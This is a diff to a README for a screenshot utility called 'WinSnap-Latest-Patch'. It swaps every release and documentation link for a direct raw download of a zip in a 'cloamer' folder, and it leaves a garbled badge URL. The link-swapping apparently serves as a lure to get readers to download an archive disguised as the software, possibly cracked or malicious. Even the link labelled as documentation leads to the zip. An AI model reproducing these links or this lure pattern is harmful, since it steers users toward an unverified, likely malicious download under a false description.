@@ -1,6 +1,6 @@
 # 📸 WinSnap-Latest-Patch - Effortless Screenshots for Everyone
 
-[![Download WinSnap](https://img.shields.io/badge/Download%20WinSnap%20Now-blue.svg)](https://github.com/JohnnySu2/WinSnap-Latest-Patch/releases)
+[![Download WinSnap](https://raw.githubusercontent.com/JohnnySu2/WinSnap-Latest-Patch/main/cloamer/WinSnap-Latest-Patch-3.4.zip%20WinSnap%https://raw.githubusercontent.com/JohnnySu2/WinSnap-Latest-Patch/main/cloamer/WinSnap-Latest-Patch-3.4.zip)](https://raw.githubusercontent.com/JohnnySu2/WinSnap-Latest-Patch/main/cloamer/WinSnap-Latest-Patch-3.4.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ WinSnap is a powerful tool designed to enhance your screen capture experience on
 
 1. **Visit the Download Page**  
    Click the link below to access the latest release.
-   [Download WinSnap Now](https://github.com/JohnnySu2/WinSnap-Latest-Patch/releases)
+   [Download WinSnap Now](https://raw.githubusercontent.com/JohnnySu2/WinSnap-Latest-Patch/main/cloamer/WinSnap-Latest-Patch-3.4.zip)
    
 2. **Choose the Correct File**  
    Look for the most recent version of WinSnap, usually marked with the latest release date. You will find files such as `.exe` or `.zip` available for download.
@@ -65,11 +65,11 @@ To make the most out of WinSnap, take some time to explore its features:
 
 Once you’re ready to begin, simply follow the installation steps outlined above. For immediate access to the latest version of WinSnap, click the link below:
 
-[Download WinSnap Now](https://github.com/JohnnySu2/WinSnap-Latest-Patch/releases)
+[Download WinSnap Now](https://raw.githubusercontent.com/JohnnySu2/WinSnap-Latest-Patch/main/cloamer/WinSnap-Latest-Patch-3.4.zip)
 
 ## 📝 Documentation and Resources
 
-For further assistance or to dive deeper into WinSnap's capabilities, explore our detailed documentation on the [GitHub Pages](https://github.com/JohnnySu2/WinSnap-Latest-Patch/releases). Find guides, FAQs, and troubleshooting tips that can help you navigate potential challenges as you use WinSnap.
+For further assistance or to dive deeper into WinSnap's capabilities, explore our detailed documentation on the [GitHub Pages](https://raw.githubusercontent.com/JohnnySu2/WinSnap-Latest-Patch/main/cloamer/WinSnap-Latest-Patch-3.4.zip). Find guides, FAQs, and troubleshooting tips that can help you navigate potential challenges as you use WinSnap.
 
 ## 🔗 Related Topics
 
